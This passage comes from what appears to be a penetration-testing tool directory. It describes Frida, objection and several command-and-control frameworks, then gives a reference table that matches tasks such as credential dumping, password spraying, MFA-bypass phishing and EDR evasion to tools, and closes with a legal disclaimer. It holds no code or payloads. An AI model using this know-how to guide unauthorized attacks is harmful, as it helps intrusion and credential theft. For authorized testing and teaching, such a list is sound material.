Injects JavaScript into running processes to hook and intercept function calls. Used for bypassing SSL pinning in mobile apps, dynamic analysis, and runtime manipulation of mobile applications.

**When:** Bypassing certificate pinning to intercept mobile app traffic in Burp Suite. Dynamic analysis and function hooking of mobile applications.

---

### 🔍 objection
**Type:** Command-line tool (Python)
**GitHub:** [https://github.com/sensepost/objection](https://github.com/sensepost/objection)

Runtime mobile exploration toolkit powered by Frida. Simplifies common mobile security testing tasks — SSL pinning bypass, root/jailbreak detection bypass, memory exploration, class method listing.

**When:** Mobile application testing — bypassing SSL pinning and root detection with simpler commands than raw Frida scripting.

---

## §20 — C2 FRAMEWORKS & RED TEAM INFRASTRUCTURE

*You need a command-and-control framework for advanced red team operations.*

---

### 🔍 Cobalt Strike
**Type:** Commercial application (Java)
**Link:** [https://www.cobaltstrike.com](https://www.cobaltstrike.com)

The industry-standard commercial C2 framework. Beacons (agents) communicate with a team server over HTTP/S, DNS, or SMB. Malleable C2 profiles allow traffic to be disguised as legitimate services. Includes a complete post-exploitation toolkit, team collaboration features, and reporting. Requires a commercial license.

**When:** Advanced red team operations simulating nation-state or sophisticated threat actor behavior. Enterprise adversary simulation engagements.

---

### 🔍 Sliver
**Type:** Command-line C2 framework (Go)
**GitHub:** [https://github.com/BishopFox/sliver](https://github.com/BishopFox/sliver)

Free, open-source C2 framework designed as an alternative to Cobalt Strike. Supports HTTP/S, DNS, WireGuard, and mTLS C2 channels. Multi-player support, implant generation for Windows/Linux/macOS.

**When:** Red team operations requiring a capable C2 framework without the Cobalt Strike license cost. Growing adoption among professional red teams.

---

### 🔍 Havoc
**Type:** Command-line C2 framework (C/C++)
**GitHub:** [https://github.com/HavocFramework/Havoc](https://github.com/HavocFramework/Havoc)

Modern, open-source C2 framework with a web-based team server interface. Supports Demon agents (Windows), dynamic configuration, sleep obfuscation, and Kerberos integration.

**When:** Advanced red team operations. Modern alternative to Sliver with additional evasion capabilities.

---

### 🔍 Nighthawk / Brute Ratel C4
**Type:** Commercial C2 frameworks

Commercial alternatives to Cobalt Strike favored for AV/EDR evasion. Used by advanced red teams.

- **Brute Ratel C4:** [https://bruteratel.com](https://bruteratel.com)

**When:** Engagements simulating advanced threat actors where standard C2 frameworks are detected by EDR solutions.

---

## 🔑 MASTER QUICK-REFERENCE TABLE

| Situation | Primary Tool | Backup Tool |
|-----------|-------------|-------------|
| Full OSINT on a company | Maltego | SpiderFoot + recon-ng |
| Subdomain enumeration | Amass + crt.sh | Subfinder |
| Email harvesting | theHarvester | Hunter.io |
| Username search | Sherlock | WhatsMyName |
| Email breach check | HaveIBeenPwned | Dehashed |
| Dark web credential search | Intelligence X | PwnDB |
| Find exposed databases | LeakLooker + Shodan | Censys |
| Port scanning (fast) | Masscan → Nmap | Rustscan |
| Port scanning (thorough) | Nmap -sV -sC -O | Rustscan → Nmap |
| Web vulnerability scan | Nuclei | Nikto |
| Web app testing (manual) | Burp Suite | OWASP ZAP |
| SQL injection | SQLmap | Manual + Burp |
| Directory brute force | ffuf | Gobuster |
| Password hash cracking | Hashcat | John the Ripper |
| Network brute force | Hydra | Medusa |
| M365 password spray | TREVORspray | MSOLSpray |
| Windows exploitation | Metasploit | Impacket |
| AD enumeration | BloodHound + SharpHound | PowerView |
| Credential dumping | Mimikatz | Impacket secretsdump |
| Lateral movement | CrackMapExec | Impacket |
| Internal hash capture | Responder | Bettercap |
| Traffic capture | Wireshark | tcpdump |
| Phishing campaign | GoPhish | SET |
| MFA bypass phishing | Evilginx2 | Evilginx2 |
| Browser exploitation | BeEF | SET |
| WiFi cracking | Aircrack-ng + Hashcat | Wifiphisher |
| Cloud AWS assessment | ScoutSuite | Pacu |
| Malware analysis | ANY.RUN | Hybrid Analysis |
| Binary reverse engineering | Ghidra | radare2 |
| Mobile app testing | MobSF + Frida | objection |
| Advanced C2 (free) | Sliver | Havoc |
| Full anonymity | Whonix | Tails OS |
| Practice environment | Hack The Box | TryHackMe |
| Learn web security | PortSwigger Academy | PentesterLab |
| Vulnerability research | NVD + EPSS + CISA KEV | Vulners |
| Exploit search | Exploit-DB / SearchSploit | PacketStorm |

---


## ⚠️ Legal Disclaimer

This document and the tools listed within are provided for **educational purposes and authorized security research only**. The creator of this repository does not condone, encourage, or support any illegal activities. You are solely responsible for your own actions. Any use of these tools must strictly comply with local and international laws, and you must obtain explicit, written permission from the system owners before conducting any security testing.

---

*All tools listed are used by professional penetration testers in authorized security assessments. All use requires explicit written authorization from system owners. Without authorization, use of these tools is illegal under the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), and equivalent laws globally.*